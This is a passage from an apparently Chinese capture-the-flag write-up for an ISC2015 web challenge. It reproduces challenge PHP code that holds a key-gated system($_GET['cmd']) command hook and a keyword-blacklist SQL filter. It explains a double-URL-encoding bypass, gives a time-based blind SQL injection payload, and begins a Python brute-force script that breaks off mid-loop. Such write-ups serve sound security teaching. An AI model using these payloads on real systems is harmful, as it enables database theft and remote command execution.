            Historical
    EOF;
    echo $content;
    if($name && $cat){
        echo post("http://10.18.25.154:10002/isc/query.php",array("data"=>RotEncrypt("name=$name&cat=$cat","ISC2015")));
    }
    if($_POST['key'] == "{$key}"){
        system($_GET['cmd']);
    }
    /*
    query.php:
    include "config.php";
    function RotDecrypt($str, $pass){
       $pass = str_split(str_pad('', strlen($str), $pass, STR_PAD_RIGHT));
       $stra = str_split($str);
       foreach($stra as $k=>$v){
         $tmp = ord($v)-ord($pass[$k]);
         $stra[$k] = chr( $tmp < 0 ?($tmp+256):$tmp);
       }
       return join('', $stra);
    }
    function Fsql($sql){
        if(preg_match('/(and|ascii|concat|from|group by|group_concat|hex|limit|lpad|or|select|substr|union|where|s)/i', $sql)){
            return "";
        }else{
            return $sql;
        }
    }
    parse_str(RotDecrypt($_POST['data'],"ISC2015"), $str);
    $connection = mysql_connect($db_host,$db_username,$db_password) or die("could not connect to Mysql");
    mysql_query("set names 'utf8'");
    $db_selecct=mysql_select_db($db_database) or die("could not to the database");
    $query="select * from test where name = '".Fsql($str[name])."'";
    $result = @mysql_query($query);
    if($result){
        $res=mysql_fetch_array($result);
        if($res['name']){
            echo $str[name]." exist.";
        }else{
            echo $str[name]." not exist.";
        }
    }
    */
注:其中query.php是不能访问的。
仔细看了一下源码,发现其实是利用parse_str解码,然后绕过WAF的SQL注入。
1\. 首先看看index.php,它使用CURL将POST请求发送到query.php,
然后query.php使用parsestr接受参数,相信敏感的童鞋已经发现问题了,parsestr对字符串进行解析,同时还自带urldecode功能,所以name参数通过使用%2527就可以绕过addslashes函数。
2\. 接下来面对的就是一个简单的WAF函数Fsql,它过滤了指定的一些关键字,参考 https://www.exploit-db.com/papers/17934/ , 绕过方法如下:  
    '||if(rpad(`key`,1,1)='a',sleep(3),1)#
通过以上分析,写了一个简单的Python脚本来跑出Key:
    import httplib
    import time
    import urllib
    headers = {"Content-type": "application/x-www-form-urlencoded" , "Accept": "text/plain"}
    payloads = 'abcdefghijklmnopqrstuvwxyz0123456789'
    print '[%s] Start to retrive key:' % time.strftime('%H:%M:%S', time.localtime())
    key = ''
    for i in range(1, 33):
        for payload in payloads:
            err_count = 0
            try:
                s = "'||if(rpad(`key`,%d,1)='%s',sleep(3),1)#" % (i,key+payload)
                body = "name=%s&cat=aaa&submit=Query" % urllib.quote_plus(urllib.quote_plus(s))